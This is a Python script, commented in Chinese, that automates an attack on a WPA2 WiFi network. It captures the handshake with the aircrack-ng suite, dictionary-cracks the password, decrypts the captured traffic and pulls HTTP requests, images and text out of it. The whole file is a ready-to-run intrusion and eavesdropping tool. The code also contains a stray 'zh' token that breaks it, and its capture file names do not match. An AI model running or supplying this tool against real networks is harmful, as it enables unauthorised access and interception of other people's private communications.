import os
import sys
import subprocess
import signal
import re
import pyshark
import time
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import binascii

OUTPUT_DIR = "./output"     # 保存解密文件的目录

class WifiAnalyzer:
    def __init__(self):
        # 捕获相关参数（airodump-ng）
        self.original_interface = ""
        self.monitor_interface = ""
        self.channel = ""
        self.ssid = ""
        self.bssid = ""  # 目标WiFi的BSSID（airodump-ng扫描获取，提高抓包精准度）
        self.capture_count = 0
        self.capture_files = []
        self.capture_process = None
        
        # 破解相关参数
        self.wordlist_path = ""
        self.wifi_password = None

    def input_capture_parameters(self):
        """交互式输入捕获参数"""
        print("[*] === WiFi捕获参数配置 ===")
        self.original_interface = input("[+] 请输入原始网卡名称 (如wlp2s0): ").strip()
        self.ssid = input("[+] 请输入目标WiFi的SSID (名称): ").strip()
        self.wordlist_path = input("[+] 请输入密码字典文件路径: ").strip()
        
        # 验证密码字典是否存在
        if not os.path.exists(self.wordlist_path) or not os.path.isfile(self.wordlist_path):
            print(f"[WARNING] 密码字典文件 {self.wordlist_path} 不存在，请确认路径正确！")
        
        # 创建输出目录
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        print("\n[*] 配置完成，准备初始化监控模式...")

    def setup_monitor_mode(self):
        """设置网卡为监控模式 + 扫描目标WiFi的BSSID和信道（airodump-ng）"""
        try:
            print(f"\n[*] 正在启用 {self.original_interface} 的监控模式...")
            # 关闭干扰进程
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True)
            # 启动监控模式
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.original_interface],
                capture_output=True, text=True, check=True
            )
            
            # 提取监控接口名
            for line in result.stdout.splitlines():
                if "monitor mode enabled on" in line:
                    self.monitor_interface = line.split()[-1]
                    break
            if not self.monitor_interface:
                self.monitor_interface = f"{self.original_interface}mon"
                print(f"[*] 自动推断监控接口为: {self.monitor_interface}")

            # 验证监控模式
            check_mode = subprocess.run(["iwconfig", self.monitor_interface], capture_output=True, text=True)
            if "Mode:Monitor" not in check_mode.stdout:
                print(f"[ERROR] {self.monitor_interface} 未成功进入监控模式！")
                return False

            # 关键：用airodump-ng扫描目标WiFi的BSSID和信道（避免手动输入信道错误）
            print(f"\n[*] 正在扫描目标WiFi '{self.ssid}' 的BSSID和信道（扫描10秒...）")
            scan_result = subprocess.run(
                ["sudo", "airodump-ng", "-w", "/tmp/scan", "-o", "csv", "--essid", self.ssid, self.monitor_interface, "-c", "1-14,36-64,149-165", "--output-format", "csv"],
                capture_output=True, text=True, timeout=10  # 扫描所有常见信道，10秒后停止
            )
            
            # 从扫描结果中提取BSSID和信道
            scan_file = "/tmp/scan-01.csv"
            if os.path.exists(scan_file):
                with open(scan_file, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        if self.ssid in line and "WPA2" in line:
                            parts = line.strip().split(",")
                            self.bssid = parts[0].strip()  # BSSID（路由器MAC）
                            self.channel = parts[3].strip()  # 信道
                            break
                os.remove(scan_file)  # 删除临时扫描文件
            
            # 验证扫描结果
            if not self.bssid or not self.channel:
                print(f"[WARNING] 自动扫描失败，请手动输入目标WiFi的BSSID和信道")
                self.bssid = input("[+] 请输入目标WiFi的BSSID (如94:90:10:8d:14:50): ").strip()
                self.channel = input("[+] 请输入目标WiFi的信道 (如36): ").strip()
            else:
                print(f"[✅] 自动扫描成功！目标BSSID: {self.bssid}，信道: {self.channel}")

            # 锁定信道（避免airodump-ng跳信道）
            subprocess.run(["sudo", "iwconfig", self.monitor_interface, "channel", self.channel], check=True)
            print(f"[*] 监控模式初始化完成：接口={self.monitor_interface}，BSSID={self.bssid}，信道={self.channel}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] 设置监控模式失败: {e.stderr}")
            return False
        except subprocess.TimeoutExpired:
            print(f"[*] 扫描超时，将手动输入BSSID和信道")
            self.bssid = input("[+] 请输入目标WiFi的BSSID: ").strip()
            self.channel = input("[+] 请输入目标WiFi的信道: ").strip()
            subprocess.run(["sudo", "iwconfig", self.monitor_interface, "channel", self.channel], check=True)
            return True
        except Exception as e:
            print(f"[ERROR] 发生错误: {str(e)}")
            return False

    def cleanup_monitor_mode(self):
        """清理监控模式，恢复网络"""
        if self.monitor_interface:
            print(f"\n[*] 正在关闭 {self.monitor_interface} 的监控模式...")
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface], capture_output=True, text=True)
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, text=True)
                print("[*] 监控模式已关闭，网络已恢复")
            except Exception as e:
                print(f"[ERROR] 清理监控模式时出错: {str(e)}")

    def start_capture(self):
        """用airodump-ng抓包（精准捕获目标WiFi的握手包和数据帧）"""
        self.capture_count += 1
        default_filename = f"capture_{self.capture_count}.pcap"
        filename = input(f"[+] 请输入第{self.capture_count}次捕获的文件名 (默认: {default_filename}): ").strip()
        if not filename:
            filename = default_filename
        
        # 关键：airodump-ng命令（锁定BSSID和信道，只抓目标WiFi的包）
        cmd = [
            "sudo", "airodump-ng",
            "-c", self.channel,          # 锁定信道
            "--bssid", self.bssid,       # 锁定目标BSSID（避免抓其他WiFi的包）
            "-w", filename,              # 输出文件前缀（会自动加.pcap后缀）
            "--output-format", "pcap",   # 强制输出pcap格式
            self.monitor_interface       # 监控接口
        ]
        
        # 抓包引导提示（确保触发握手）
        print(f"\n[⚠️  关键操作] 请严格执行以下步骤：")
        print(f"1. 设备断开与 '{self.ssid}' 的连接")
        print(f"2. 按回车开始抓包 → 设备重新连接WiFi（触发四次握手）")
        print(f"3. 连接后刷网页/发消息（10秒），按 Ctrl+C 停止抓包\n")
        print(f"[*] 开始第{self.capture_count}次捕获（airodump-ng），数据将保存到 {filename}.pcap")
        
        # 启动airodump-ng进程（单独线程监控停止信号）
        self.capture_process = subprocess.Popen(cmd)zh
        try:
            # 等待用户按Ctrl+C停止抓包（airodump-ng需用Ctrl+C终止）
            self.capture_process.wait()
        except KeyboardInterrupt:
            # 用户按Ctrl+C，终止airodump-ng进程
            print("\n[*] 正在停止捕获...")
            self.capture_process.send_signal(signal.SIGINT)
            time.sleep(1)
            if self.capture_process.poll() is None:
                self.capture_process.terminate()
        
        # 验证捕获文件（airodump-ng会自动加.pcap后缀，如capture_1.pcap）
        full_filename = f"{filename}-01.cap"
        if os.path.exists(full_filename):
            file_size = os.path.getsize(full_filename)
            # 检查是否包含四次握手包
            try:
                capture = pyshark.FileCapture(full_filename, display_filter="eapol", keep_packets=False)
                eapol_count = len([pkt for pkt in capture])
                if eapol_count >= 4:
                    print(f"[✅] 捕获成功！包含 {eapol_count} 个EAPOL握手包，文件: {full_filename}（{file_size}字节）")
                    self.capture_files.append(full_filename)
                    return full_filename
                else:
                    print(f"[WARNING] 捕获文件无完整握手包（仅{eapol_count}个EAPOL包），已删除")
                    os.remove(full_filename)
                    return None
            except Exception as e:
                print(f"[WARNING] 检查握手包出错: {str(e)}，保留文件: {full_filename}")
                self.capture_files.append(full_filename)
                return full_filename
        else:
            print(f"[WARNING] 捕获文件 {full_filename} 未生成")
            return None

    def crack_wifi_password(self, pcap_file):
        """破解单个pcap文件（airodump-ng抓包后，aircrack-ng破解）"""
        if not os.path.exists(pcap_file) or os.path.getsize(pcap_file) < 1024:
            print(f"[ERROR] 破解文件 {pcap_file} 无效（不存在或过小）")
            return None, "无效文件"
        
        # 验证pcap格式
        with open(pcap_file, "rb") as f:
            header = f.read(4)
            if header not in (b'\xa1\xb2\xc3\xd4', b'\xd4\xc3\xb2\xa1'):
                print(f"[ERROR] {pcap_file} 不是传统pcap格式，无法破解")
                return None, "格式错误"
        
        try:
            # 正确的aircrack-ng命令（-z强制握手包验证，-b锁定BSSID提高效率）
            command = [
                'aircrack-ng',
                '-e', self.ssid,
                '-b', self.bssid,  # 锁定BSSID，避免解析其他WiFi的包
                '-w', self.wordlist_path,
                '-z',  # 无需IV，用握手包验证
                pcap_file
            ]

            print(f"\n[*] 正在破解文件: {pcap_file}")
            print(f"[*] 执行命令: {' '.join(command)}")
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, 
                text=True 
            )

            stdout, _ = process.communicate()
            print(stdout)

            key_found = None
            error_message = None
            for line in stdout.splitlines():
                if "KEY FOUND!" in line:
                    match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                    if match:
                        key_found = match.group(1)
                elif "No matching PMKID found" in line or "No key found" in line:
                    error_message = "字典中无匹配密码"
                elif "Not enough EAPOL packets" in line:
                    error_message = "握手包不完整"
        
        except Exception as e:
            key_found = None
            error_message = f"破解出错: {str(e)}"
        
        return key_found, error_message

    def batch_crack(self):
        """批量破解两次捕获的文件（先试capture_1，再试capture_2）"""
        if not self.capture_files:
            print("[ERROR] 无有效捕获文件，无法破解")
            return False
        
        print(f"\n[*] 开始批量破解（共{len(self.capture_files)}个文件）...")
        for idx, pcap_file in enumerate(self.capture_files, 1):
            print(f"\n[=== 正在破解第{idx}个文件: {pcap_file} ===]")
            password, err = self.crack_wifi_password(pcap_file)
            if password:
                self.wifi_password = password
                print(f"[✅] 破解成功！WiFi密码: {self.wifi_password}")
                return True  # 破解成功则停止，无需试其他文件
            else:
                print(f"[❌] 第{idx}个文件破解失败: {err}")
        
        # 所有文件都破解失败
        print(f"\n[ERROR] 所有捕获文件破解失败（可能原因：字典无密码/握手包无效）")
        return False

    # 以下为解密和HTTP提取逻辑（保持不变）
    def extract_handshake(self, pcap_file):
        if not os.path.exists(pcap_file):
            print(f"[ERROR] 握手包检查文件 {pcap_file} 不存在")
            return False
        print(f"[*] 检查 {pcap_file} 的EAPOL握手包...")
        try:
            capture = pyshark.FileCapture(pcap_file, display_filter="eapol")
            eapol_count = len([pkt for pkt in capture])
            if eapol_count < 4:
                print(f"[!] 仅捕获到 {eapol_count} 个EAPOL包，无法解密")
                return False
            print(f"[*] 包含 {eapol_count} 个EAPOL包，握手包完整")
            return True
        except Exception as e:
            print(f"[ERROR] 检查握手包出错: {str(e)}")
            return False

    def generate_pmk(self, password, ssid):
        print("[*] 生成 PMK...")
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=32,
            salt=ssid.encode(),
            iterations=4096,
        )
        pmk = kdf.derive(password.encode())
        print(f"[*] PMK: {binascii.hexlify(pmk).decode()}")
        return pmk

    def decrypt_wpa2(self, pcap_file):
        if not self.wifi_password:
            print("[ERROR] 无WiFi密码，无法解密")
            return None
        if not os.path.exists(pcap_file):
            print(f"[ERROR] 解密文件 {pcap_file} 不存在")
            return None
        
        print(f"[*] 用密码 {self.wifi_password} 解密 {pcap_file}...")
        output_file = os.path.join(OUTPUT_DIR, "decrypted.pcap")
        try:
            # 用airdecap-ng解密（与airodump-ng配套）
            result = subprocess.run(
                ["sudo", "airdecap-ng", "-e", self.ssid, "-p", self.wifi_password, "-b", self.bssid, pcap_file, "-o", output_file],
                text=True, capture_output=True
            )
            print(result.stdout)
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                print(f"[*] 解密完成，文件: {output_file}")
                return output_file
            else:
                print(f"[ERROR] 解密文件生成失败: {result.stderr}")
                return None
        except Exception as e:
            print(f"[ERROR] 解密出错: {str(e)}")
            return None

    def extract_http_data(self, decrypted_pcap):
        """从解密后的pcap文件中提取HTTP数据（重点提取图片、文本等可见内容）"""
        if not decrypted_pcap or not os.path.exists(decrypted_pcap):
            print("[ERROR] 解密文件不存在或路径错误，无法提取HTTP数据")
            return
        
        # 创建HTTP数据保存子目录
        http_save_dir = os.path.join(OUTPUT_DIR, "extracted_http_data")
        os.makedirs(http_save_dir, exist_ok=True)
        print(f"\n[*] 开始从 {decrypted_pcap} 提取HTTP数据，结果保存到: {http_save_dir}")
        
        try:
            # 用pyshark过滤HTTP协议包
            capture = pyshark.FileCapture(
                decrypted_pcap,
                display_filter="http",  # 仅解析HTTP协议包
                keep_packets=False      # 不缓存数据包，节省内存
            )
            
            http_packet_count = 0  # 统计HTTP包总数
            saved_file_count = 0   # 统计保存的文件总数
            
            for pkt in capture:
                http_packet_count += 1
                pkt_num = pkt.number  # 数据包编号（用于命名文件）
                
                try:
                    # 1. 提取HTTP请求/响应的基本信息（保存到日志）
                    http_info = f"数据包{ pkt_num }: "
                    if hasattr(pkt.http, 'request_method'):
                        # HTTP请求（如GET/POST）
                        http_info += f"请求 {pkt.http.request_method} {pkt.http.host}{pkt.http.request_uri}"
                    elif hasattr(pkt.http, 'response_code'):
                        # HTTP响应（如200/404）
                        http_info += f"响应 {pkt.http.response_code} {pkt.http.content_type}"
                    else:
                        continue  # 跳过无关键信息的HTTP包
                    
                    # 将HTTP基本信息写入日志
                    with open(os.path.join(http_save_dir, "http_log.txt"), "a", encoding="utf-8") as log_f:
                        log_f.write(http_info + "\n")
                    print(f"[+] 数据包{ pkt_num }: {http_info}")

                    # 2. 提取HTTP中的文件数据（如图片、文本）
                    if hasattr(pkt.http, 'file_data'):
                        # 获取16进制文件数据并清理无效字符
                        raw_file_data = pkt.http.file_data
                        cleaned_data = re.sub(r'[^0-9a-fA-F]', '', raw_file_data)
                        
                        if not cleaned_data:
                            print(f"[-] 数据包{ pkt_num }: 无有效文件数据，跳过")
                            continue
                        
                        # 根据Content-Type判断文件类型，生成对应文件名
                        if hasattr(pkt.http, 'content_type'):
                            content_type = pkt.http.content_type.lower()
                            if "image/jpeg" in content_type or "image/jpg" in content_type:
                                file_ext = ".jpg"
                            elif "image/png" in content_type:
                                file_ext = ".png"
                            elif "text/plain" in content_type:
                                file_ext = ".txt"
                            elif "application/json" in content_type:
                                file_ext = ".json"
                            else:
                                file_ext = ".bin"  # 未知类型保存为二进制文件
                        else:
                            file_ext = ".bin"
                        
                        # 保存文件到指定目录
                        save_filename = os.path.join(http_save_dir, f"http_file_{pkt_num}{file_ext}")
                        with open(save_filename, "wb") as file_f:
                            file_f.write(binascii.unhexlify(cleaned_data))
                        
                        saved_file_count += 1
                        print(f"[+] 数据包{ pkt_num }: 已保存文件 → {save_filename}")
                
                except AttributeError as e:
                    # 忽略缺失字段的数据包（如部分HTTP包无file_data）
                    continue
                except Exception as e:
                    print(f"[-] 处理数据包{ pkt_num }时出错: {str(e)}")
                    continue
            
            # 提取完成后统计结果
            print(f"\n[*] HTTP数据提取完成！")
            print(f"[*] 共解析HTTP数据包: {http_packet_count} 个")
            print(f"[*] 成功保存文件: {saved_file_count} 个")
            print(f"[*] 提取结果目录: {http_save_dir}")
        
        except Exception as e:
            print(f"[ERROR] 提取HTTP数据时发生全局错误: {str(e)}")


    def run(self):
        """核心流程入口：参数输入 → 监控模式 → 两次抓包 → 批量破解 → 解密 → 数据提取"""
        print("="*50)
        print("          WiFi分析工具（airodump-ng抓包 + aircrack-ng破解）          ")
        print("="*50)
        
        try:
            # 1. 输入捕获参数（网卡、SSID、字典路径）
            self.input_capture_parameters()

            # 2. 初始化监控模式（自动扫描BSSID+信道）
            if not self.setup_monitor_mode():
                print("[ERROR] 监控模式初始化失败，程序无法继续，退出！")
                return

            # 3. 执行两次抓包（确保至少有一个有效文件）
            print(f"\n[*] 开始执行两次抓包（每次抓包需触发设备连接WiFi）")
            while self.capture_count < 2:
                print(f"\n[=== 准备第{self.capture_count + 1}次抓包 ===]")
                captured_file = self.start_capture()
                
                # 若抓包失败，询问是否重试
                if not captured_file:
                    retry = input(f"[?] 第{self.capture_count}次抓包失败，是否重试？(y/n): ").strip().lower()
                    if retry != 'y':
                        self.capture_count += 1  # 不重试则跳过本次，进入下一次
                else:
                    # 抓包成功，自动进入下一次
                    print(f"[*] 第{self.capture_count}次抓包完成，等待开始下一次...")
                    input("[*] 按回车键开始第{self.capture_count + 1}次抓包（若已完成两次，将进入破解）...")

            # 4. 批量破解所有捕获文件（先试capture_1，再试capture_2）
            crack_success = self.batch_crack()
            if not crack_success:
                print("[*] 破解流程结束，未获取到WiFi密码，跳过解密和数据提取")
                return

            # 5. 解密WPA2流量（使用破解成功的密码，选择第一个有效pcap文件）
            target_pcap = self.capture_files[0]  # 优先用第一次抓包的文件（通常更完整）
            if self.extract_handshake(target_pcap):  # 先验证握手包完整性
                decrypted_file = self.decrypt_wpa2(target_pcap)
                if not decrypted_file:
                    print("[ERROR] 流量解密失败，无法提取HTTP数据")
                    return
            else:
                print("[ERROR] 握手包不完整，无法进行WPA2流量解密")
                return

            # 6. 从解密后的文件中提取HTTP数据
            self.extract_http_data(decrypted_file)

        except KeyboardInterrupt:
            print("\n[ERROR] 用户手动中断程序（Ctrl+C）")
        except Exception as e:
            print(f"\n[ERROR] 程序执行过程中发生全局错误: {str(e)}")
        finally:
            # 无论流程是否正常结束，都必须清理监控模式
            self.cleanup_monitor_mode()
            print("\n" + "="*50)
            print("          程序全部流程结束，已恢复网络正常状态          ")
            print("="*50)


# 程序入口（需sudo权限运行）
if __name__ == "__main__":
    # 检查是否以root权限运行（无线监控模式必须root）
    if os.geteuid() != 0:
        print("[ERROR] 该程序需要root权限运行，请用 sudo python3 wifi_analyze.py 启动！")
        sys.exit(1)
    
    try:
        analyzer = WifiAnalyzer()
        analyzer.run()
    except Exception as e:
        print(f"[FATAL ERROR] 程序启动失败: {str(e)}")
        sys.exit(1)

